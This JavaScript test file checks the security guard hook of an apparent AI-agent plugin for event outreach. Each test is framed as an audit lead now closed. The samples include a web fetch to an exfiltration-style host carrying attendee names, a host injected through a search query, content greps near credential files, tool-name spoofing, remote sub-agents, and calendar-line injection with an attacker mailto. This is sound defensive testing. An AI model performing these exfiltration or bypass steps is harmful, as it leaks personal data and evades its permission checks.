// The leads the 6 Nov security audit left to check (run-1's needs-validation list), each closed: the attack that
// could have worked, and must fail now.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, execFileSync } from 'node:child_process';
import { writeFileSync, readFileSync, mkdirSync, mkdtempSync, symlinkSync, openSync, writeSync, closeSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { setup, ROOT, NOW } from './fixtures/harness.mjs';
import { recordSearchHosts, seenHosts, webRefusal, fileRefusal, testPasses, givenServer, inheritedRun } from '../hooks/guard.mjs';
import { isBrowserCall } from '../lib/security.mjs';
import { readChecked, realPath, sensitiveKind } from '../lib/paths.mjs';
import { toCsv } from '../lib/csv.mjs';
import { renderIcs } from '../skills/event-outreach/scripts/agenda.mjs';

const hook = (H, input, { now = NOW, args = [] } = {}) =>
  spawnSync('node', [join(ROOT, 'hooks/guard.mjs'), ...args], {
    input: JSON.stringify(input),
    env: { ...process.env, FLOORBOSS_HOME: H.HOME, FLOORBOSS_NOW: now },
    encoding: 'utf8'
  });
const asks = (r) => /"permissionDecision":"ask"/.test(r.stdout || '');
const ONE = 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n';
// Runs fn with FLOORBOSS_HOME pointing at this test's home (the guard's functions read it at each call).
const inHome = (H, fn) => {
  const prev = process.env.FLOORBOSS_HOME;
  process.env.FLOORBOSS_HOME = H.HOME;
  try {
    return fn();
  } finally {
    if (prev === undefined) delete process.env.FLOORBOSS_HOME;
    else process.env.FLOORBOSS_HOME = prev;
  }
};

test('L1: a web search opens only the hosts it returned, never one it was asked about or a bare public suffix', () => {
  const H = setup({ attendees: ONE });
  inHome(H, () => {
    const now = Date.now();
    recordSearchHosts(
      { results: [{ title: 'see https://evil.test/x', url: 'https://acme.test/about' }, { url: 'https://co.uk/' }] },
      now,
      'acme site:evil.test'
    );
    const seen = seenHosts(now);
    assert.ok(seen.includes('acme.test'), 'a result link opens');
    assert.ok(!seen.includes('evil.test'), 'a host named in the query (and echoed in a title) stays closed');
    assert.ok(!seen.includes('co.uk'), 'a bare public suffix stays closed');
    // Even as a result's own link, a host the search named stays closed.
    recordSearchHosts({ results: [{ url: 'https://evil2.test/' }, { url: 'https://news.test/a' }] }, now, 'site:evil2.test acme');
    assert.ok(!seenHosts(now).includes('evil2.test'));
    assert.ok(seenHosts(now).includes('news.test'));
    // However the search spells it: a trailing full stop, ideographic stops, spaces.
    for (const [q, h] of [
      ['site:evil3.test.', 'evil3.test'],
      ['evil4\u3002test', 'evil4.test'],
      ['evil5 . test', 'evil5.test']
    ]) {
      recordSearchHosts({ results: [{ url: `https://${h}/` }] }, now, q);
      assert.ok(!seenHosts(now).includes(h), q);
    }
    // A returned host opens as returned: a subdomain of it (a bare hosting root someone's pages hang off) doesn't.
    recordSearchHosts({ results: [{ url: 'https://tunnel-host.test/' }] }, now, 'acme');
    const web = (url) => webRefusal('WebFetch', { url }, { active: true, session: 's' }, [], { researcher: true, seen: seenHosts(now), companies: [] });
    assert.equal(web('https://tunnel-host.test/page'), null);
    assert.ok(web('https://exfil-1.tunnel-host.test/c?d=AnaBerg'));
  });
});

test('L2: a browser reached through another server (remote devices) is held as a browser', () => {
  assert.equal(isBrowserCall('remote-devices', 'Claude_Browser__browser_click'), true);
  assert.equal(isBrowserCall('remote-devices', 'Claude_Browser__navigate'), true);
});

test("L3: while floorboss runs, a search that prints lines runs only over floorboss's own folders; listing matches still works", () => {
  const H = setup({ attendees: ONE });
  const dir = mkdtempSync(join(tmpdir(), 'fb-grep-'));
  mkdirSync(join(dir, '.docker'));
  writeFileSync(join(dir, '.docker', 'config.json'), '{"auths":{}}\n');
  writeFileSync(join(dir, 'index.js'), 'const k = 1;\n');
  const RUN = { active: true, session: 'sess-run' };
  inHome(H, () => {
    const grep = (extra, where = dir, run = RUN) => fileRefusal('Grep', { pattern: 'x', path: where, output_mode: 'content', ...extra }, run);
    for (const extra of [{}, { glob: '*.js' }, { type: 'js' }, { type: 'c' }, { glob: '*.json' }])
      assert.match(grep(extra) || '', /files_with_matches/, JSON.stringify(extra));
    assert.equal(fileRefusal('Grep', { pattern: 'x', path: dir, output_mode: 'files_with_matches' }, RUN), null, 'listing file names prints no lines');
    assert.equal(grep({}, H.dir), null, "floorboss's own data folder");
    assert.ok(grep({}, ROOT), 'the plugin folder (a checkout can hold anything) is no exception');
    assert.ok(fileRefusal('Grep', { pattern: 'x', path: dir, output_mode: 'Content' }, RUN), "a mode floorboss doesn't know");
    assert.equal(grep({}, dir, { active: false }), null, 'outside a run, as before');
  });
});

test("L4: a test chat message goes to the user's own number only, with no thread or reply id beside it", () => {
  const now = Date.now();
  const pending = { task: 'chat.send', server: 'whatsapp', tool: 'send_message', to: '+1 202 555 0147', at: new Date(now).toISOString() };
  const t = (ti, name = 'mcp__whatsapp__send_message') => testPasses({ tool_name: name, tool_input: ti }, pending, now);
  assert.equal(t({ to: '+12025550147', text: 'floorboss test' }), true);
  assert.equal(t({ to: '+12025550147', text: 'floorboss test', thread: 'group-77@chat.test' }), false, 'a group thread is another chat');
  assert.equal(t({ to: '+12025550147', text: 'floorboss test', in_reply_to: 'ABCD1234' }), false);
  // A content type or a body-text field is no destination.
  assert.equal(t({ to: '+12025550147', text: 'floorboss test', contentType: 'text' }), true);
  assert.equal(t({ to: '+12025550147', bodyText: 'floorboss test' }), true);
});

test("L5: a recipe's server is matched as written, claude.ai's prefix the only alias", () => {
  const now = Date.now();
  const pending = { task: 'chat.send', server: 'whatsapp', tool: 'send_message', to: '+12025550147', at: new Date(now).toISOString() };
  const t = (server) => testPasses({ tool_name: `mcp__${server}__send_message`, tool_input: { to: '+12025550147', text: 'x' } }, pending, now);
  assert.equal(t('claude_ai_whatsapp'), true);
  assert.equal(t('WhatsApp'), true, 'case aside');
  assert.equal(t('Whats_App'), false);
  assert.equal(t('whats-app'), false);
  const config = { connectors: { 'crm.read': { server: 'hubspot' } } };
  assert.equal(givenServer('hubspot', config, {}), true);
  assert.equal(givenServer('Hub_Spot', config, {}), false);
  assert.equal(givenServer('', { connectors: { x: { server: '' } } }, {}), false);
});

test('L5b: during a run, a tool name with a further "__" is never taken for the given server\'s', () => {
  const H = setup({ attendees: ONE });
  const nowIso = new Date().toISOString();
  writeFileSync(join(H.HOME, 'active.json'), JSON.stringify({ at: nowIso, sessions: { 'sess-run': nowIso } }));
  writeFileSync(
    join(H.HOME, 'config.json'),
    JSON.stringify({ connectors: { 'crm.lookup': { server: 'hubspot', tool: 'search_contacts', args: { query: '{query}' } } } })
  );
  const call = (tool) =>
    spawnSync('node', [join(ROOT, 'hooks/guard.mjs')], {
      input: JSON.stringify({ session_id: 'sess-run', hook_event_name: 'PreToolUse', tool_name: `mcp__hubspot__${tool}`, tool_input: { query: 'Acme' } }),
      env: { ...process.env, FLOORBOSS_HOME: H.HOME },
      encoding: 'utf8'
    });
  assert.equal(call('search_contacts').status, 0);
  const nested = call('get__contacts');
  assert.equal(nested.status, 2, 'from a server named "hubspot__get"');
  assert.match(nested.stderr, /wasn't given/);
});

test('L6: while floorboss runs, an agent runs on this machine only', () => {
  const H = setup({ attendees: ONE });
  const nowIso = new Date().toISOString();
  writeFileSync(join(H.HOME, 'active.json'), JSON.stringify({ at: nowIso, sessions: { 'sess-run': nowIso } }));
  const agent = (isolation) =>
    spawnSync('node', [join(ROOT, 'hooks/guard.mjs')], {
      input: JSON.stringify({
        session_id: 'sess-run',
        hook_event_name: 'PreToolUse',
        tool_name: 'Agent',
        tool_input: { subagent_type: 'floorboss:outreach-critic', prompt: 'x', ...(isolation === undefined ? {} : { isolation }) }
      }),
      env: { ...process.env, FLOORBOSS_HOME: H.HOME },
      encoding: 'utf8'
    });
  assert.equal(agent(undefined).status, 0);
  assert.equal(agent('worktree').status, 0);
  const remote = agent('remote');
  assert.equal(remote.status, 2);
  assert.match(remote.stderr, /on this machine/);
});

const ENRICH = { 'enrich.person': { server: 'apollo', tool: 'people_enrichment', args: { name: '{name}', organization_name: '{company}' } } };
const PEOPLE = [
  { id: 'c001', name: 'Ana Berg', company: 'Acme' },
  { id: 'c002', name: 'Bo Li', company: 'Globex' },
  { id: 'c003', name: 'Cy Ng', company: 'Initech' }
];
test('L7: lookups let through but not finished yet count against the number agreed', () => {
  const H = setup({ attendees: ONE });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: ENRICH }));
  writeFileSync(
    join(H.HOME, 'enrich-window.json'),
    JSON.stringify({ event: H.slug, people: PEOPLE, ids: ['c001', 'c002', 'c003'], count: 2, used: 0, until: new Date(Date.parse(NOW) + 600e3).toISOString() })
  );
  const look = (name, org) => hook(H, { tool_name: 'mcp__apollo__people_enrichment', tool_input: { name, organization_name: org }, session_id: 's1' });
  const post = (name, org) =>
    hook(
      H,
      {
        hook_event_name: 'PostToolUse',
        tool_name: 'mcp__apollo__people_enrichment',
        tool_input: { name, organization_name: org },
        tool_response: { content: [{ type: 'text', text: 'ok' }] },
        session_id: 's1'
      },
      { args: ['post'] }
    );
  assert.ok(asks(look('Ana Berg', 'Acme')), 'the first lookup asks');
  post('Ana Berg', 'Acme');
  const second = look('Bo Li', 'Globex');
  assert.equal(second.status, 0, second.stderr);
  // Bo Li's lookup is still running (no post yet): it holds the second of the two.
  const third = look('Cy Ng', 'Initech');
  assert.equal(third.status, 2, 'a third started alongside the second is refused');
  assert.match(third.stderr, /1 ran and 1 was let through without running yet/);
});

test('L7b: first lookups started together and all allowed are each counted', () => {
  const H = setup({ attendees: ONE });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: ENRICH }));
  const wpath = join(H.HOME, 'enrich-window.json');
  writeFileSync(
    wpath,
    JSON.stringify({ event: H.slug, people: PEOPLE, ids: ['c001', 'c002', 'c003'], count: 3, used: 0, until: new Date(Date.parse(NOW) + 600e3).toISOString() })
  );
  const call = (id, name, org) => ({
    tool_name: 'mcp__apollo__people_enrichment',
    tool_input: { name, organization_name: org },
    session_id: 's1',
    tool_use_id: id
  });
  const three = [call('tu1', 'Ana Berg', 'Acme'), call('tu2', 'Bo Li', 'Globex'), call('tu3', 'Cy Ng', 'Initech')];
  for (const c of three) assert.ok(asks(hook(H, c)), 'each first lookup asks');
  for (const c of three) hook(H, { hook_event_name: 'PostToolUse', ...c, tool_response: { content: [] } }, { args: ['post'] });
  hook(H, { hook_event_name: 'PostToolUse', ...three[0], tool_response: { content: [] } }, { args: ['post'] });
  assert.equal(JSON.parse(readFileSync(wpath, 'utf8')).used, 3, 'three ran, three counted; a post run again counts nothing');
});

test('L7c: first lookups still running count once the first has run, so the agreed number is never passed', () => {
  const H = setup({ attendees: ONE });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: ENRICH }));
  const wpath = join(H.HOME, 'enrich-window.json');
  const SIX = [
    ...PEOPLE,
    { id: 'c004', name: 'Di Wu', company: 'Hooli' },
    { id: 'c005', name: 'Ed Ko', company: 'Umbrella' },
    { id: 'c006', name: 'Fi Lu', company: 'Stark' }
  ];
  writeFileSync(
    wpath,
    JSON.stringify({ event: H.slug, people: SIX, ids: SIX.map((p) => p.id), count: 3, used: 0, until: new Date(Date.parse(NOW) + 600e3).toISOString() })
  );
  const call = (i) => ({
    tool_name: 'mcp__apollo__people_enrichment',
    tool_input: { name: SIX[i].name, organization_name: SIX[i].company },
    session_id: 's1',
    tool_use_id: `tu${i}`
  });
  const post = (i) => hook(H, { hook_event_name: 'PostToolUse', ...call(i), tool_response: { content: [] } }, { args: ['post'] });
  for (const i of [0, 1, 2]) assert.ok(asks(hook(H, call(i))));
  post(0);
  const let_through = [3, 4, 5].filter((i) => hook(H, call(i)).status === 0);
  for (const i of [1, 2, ...let_through]) post(i);
  assert.ok(JSON.parse(readFileSync(wpath, 'utf8')).used <= 3, `${let_through.length} more let through`);
});

test('L7e: before the first lookup has run, no more lookups ask than the window allows', () => {
  const H = setup({ attendees: ONE });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: ENRICH }));
  writeFileSync(
    join(H.HOME, 'enrich-window.json'),
    JSON.stringify({ event: H.slug, people: PEOPLE, ids: ['c001', 'c002', 'c003'], count: 2, used: 0, until: new Date(Date.parse(NOW) + 600e3).toISOString() })
  );
  const call = (i) => ({
    tool_name: 'mcp__apollo__people_enrichment',
    tool_input: { name: PEOPLE[i].name, organization_name: PEOPLE[i].company },
    session_id: 's1',
    tool_use_id: `tf${i}`
  });
  assert.ok(asks(hook(H, call(0))));
  assert.ok(asks(hook(H, call(1))));
  const third = hook(H, call(2));
  assert.equal(third.status, 2, 'two already wait at their prompt');
  assert.match(third.stderr, /2 were let through without running yet/);
});

test('L7d: lookups started at the same moment never pass the count, and each one that ran is counted', async () => {
  const { spawn } = await import('node:child_process');
  const H = setup({ attendees: ONE });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: ENRICH }));
  const wpath = join(H.HOME, 'enrich-window.json');
  const P = Array.from({ length: 8 }, (_, i) => ({ id: `c${100 + i}`, name: `Person ${String.fromCharCode(65 + i)}`, company: `Co${i}` }));
  writeFileSync(
    wpath,
    JSON.stringify({ event: H.slug, people: P, ids: P.map((p) => p.id), count: 4, used: 1, until: new Date(Date.parse(NOW) + 600e3).toISOString() })
  );
  const run = (input, args = []) =>
    new Promise((res) => {
      const c = spawn('node', [join(ROOT, 'hooks/guard.mjs'), ...args], { env: { ...process.env, FLOORBOSS_HOME: H.HOME, FLOORBOSS_NOW: NOW } });
      c.on('close', (code) => res(code));
      c.stdin.end(JSON.stringify(input));
    });
  const call = (i) => ({
    tool_name: 'mcp__apollo__people_enrichment',
    tool_input: { name: P[i].name, organization_name: P[i].company },
    session_id: 's1',
    tool_use_id: `tp${i}`
  });
  const codes = await Promise.all(P.slice(0, 7).map((_, i) => run(call(i))));
  const ok = codes.map((c, i) => (c === 0 ? i : -1)).filter((i) => i >= 0);
  assert.ok(ok.length <= 3, `${ok.length} let through with 3 left`);
  await Promise.all(ok.map((i) => run({ hook_event_name: 'PostToolUse', ...call(i), tool_response: { content: [] } }, ['post'])));
  assert.equal(JSON.parse(readFileSync(wpath, 'utf8')).used, 1 + ok.length, 'each that ran counted once');
});

test('L8: a transcript longer than one read window is read to the end before a call is judged', () => {
  const H = setup({ attendees: ONE });
  const dir = mkdtempSync(join(tmpdir(), 'fb-tr-'));
  const p = join(dir, 't.jsonl');
  const fd = openSync(p, 'w');
  const line = Buffer.from(`${JSON.stringify({ type: 'user', message: { content: 'x'.repeat(1000) } })}\n`);
  const chunk = Buffer.concat(Array.from({ length: 1024 }, () => line));
  for (let n = 0; n < 34; n++) writeSync(fd, chunk);
  // The floorboss script call lands after the first 32 MB.
  writeSync(
    fd,
    `${JSON.stringify({ type: 'assistant', message: { content: [{ type: 'tool_use', name: 'Bash', input: { command: `node "${ROOT}/skills/event-outreach/scripts/cli.mjs" todo --event x` } }] } })}\n`
  );
  closeSync(fd);
  assert.equal(
    inHome(H, () => inheritedRun('sess-long', p)),
    true
  );
});

test('L9: a file floorboss reads is a plain file at its own place: a symlink or a FIFO is refused, without hanging', () => {
  const dir = mkdtempSync(join(tmpdir(), 'fb-read-'));
  writeFileSync(join(dir, 'list.csv'), 'Name\nAna\n');
  assert.equal(readChecked(join(dir, 'list.csv')), 'Name\nAna\n');
  symlinkSync(join(dir, 'list.csv'), join(dir, 'link.csv'));
  assert.throws(() => readChecked(join(dir, 'link.csv')), /is a link/);
  execFileSync('mkfifo', [join(dir, 'pipe.csv')]);
  assert.throws(() => readChecked(join(dir, 'pipe.csv')), /plain file/);
});

test('L10: a bare CR or a Unicode line separator in calendar text never starts a new calendar line', () => {
  const data = {
    event: { name: 'Test Expo', tz: 'Europe/Amsterdam' },
    meetings: [
      { id: 'c001', start: '2026-11-10T09:00:00Z', relation: {}, person: { name: 'Ana\rATTENDEE:mailto:x@evil.test', company: 'Acme\u2028END:VEVENT' } }
    ]
  };
  const ics = renderIcs(data, new Map());
  const lines = ics.split('\r\n');
  assert.ok(!lines.some((l) => /^(ATTENDEE|END:VEVENT.+)/.test(l) && !/^END:VEVENT$/.test(l)), ics);
  assert.ok(!/[\r\u2028](?!\n)/.test(ics.replace(/\r\n/g, '')), 'no stray line break left');
});

test('L11: a CSV field with a semicolon or a tab is quoted (spreadsheets that split on them read one field)', () => {
  const out = toCsv(
    ['name', 'note'],
    [
      { name: 'Ana', note: 'a;b' },
      { name: 'Bo', note: 'c\td' }
    ]
  );
  assert.match(out, /"a;b"/);
  assert.match(out, /"c\td"/);
});

test('L12: a path under a top-level folder that does not exist keeps its whole name (it lost its first letter on Linux)', () => {
  assert.equal(realPath('/fb-no-such-folder/hosts'), '/fb-no-such-folder/hosts');
  assert.equal(realPath('/fb-no-such-folder'), '/fb-no-such-folder');
  assert.equal(sensitiveKind('/ETC/hosts'), 'config');
});
